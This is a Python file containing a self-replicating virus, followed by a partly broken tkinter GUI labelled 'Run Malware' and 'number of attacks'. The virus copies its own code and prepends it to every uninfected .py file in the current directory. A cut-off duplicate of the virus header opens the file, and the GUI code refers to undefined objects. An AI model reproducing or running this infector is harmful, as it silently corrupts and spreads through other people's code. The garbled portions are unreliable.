# VIRUS BEGINS HERE #

import sys, glob, re

# Get a copy of the virus
vCode = []
fh = open(sys.argv[0], 'r')
# VIRUS BEGINS HERE #

from tkinter import *
import sys, glob, re

# Get a copy of the virus
vCode = []
fh = open(sys.argv[0], 'r')
lines = fh.readlines()
fh.close()
inVirus = False
for line in lines:
    if(re.search('^# VIRUS BEGINS HERE', line)): inVirus = True
    if(inVirus): vCode.append(line)
    if(re.search('^# VIRUS ENDS HERE', line)): break

# Find potential victims
progs = glob.glob('*.py')

# Check and infect
for prog in progs:
    fh = open(prog, 'r')
    pCode = fh.readlines()
    fh.close()
    infected = False
    for line in pCode:
        if('# VIRUS BEGINS HERE' in line):
            infected = True
            break

    if not infected:
        newCode = []
        if('#:' in pCode[0]): newCode.append(pCode.pop(0))
        newCode.extend(vCode)
        newCode.extend(pCode)
        # Writing new virus infected code
        fh = open(prog, 'w')
        fh.writelines(newCode)
        fh.close()

# Optional payload


print("Infected")


# VIRUS ENDS HERE #


# import tkinter as tk
import main

# Set time frequency

NORM_FONT = ("Helvetica", 10)

# mn = tk.Tk()
# Label(mn, text = "Number of attacks: ").grid(row=0)
# Label(mn, text = "Frequency: ").grid(row=1)
#
# b1 = Label(mn)
# b2 = Label(mn)
#
# b1.grid(row=0, column=1)
# b2.grid(row=1, column=1)
#
# btn = tk.Button(mn, text="Run Malware", command = main)
# btn.pack()
#
# mn.mainloop()

one = Tk()

e = Entry(one, width=10)
e.pack()

b1 = Button(one, text="Enter number of attacks: ",command=lambda:b1())
b1.pack()

def b1():
    print('Yes')
    c1 = Button(two, text="Enter # of attacks in 24 hours: ", command=lambda: c1)
    c1.pack()
# def b1():
#     print('Yes')
#     c1 = Button(one, text="Enter # of attacks in 24 hours: ", command=lambda:c1)
#     c1.pack()
# b2 = Button(win,text="plant",command=lambda:set_text("plant"))
# b2.pack()

one.mainloop()
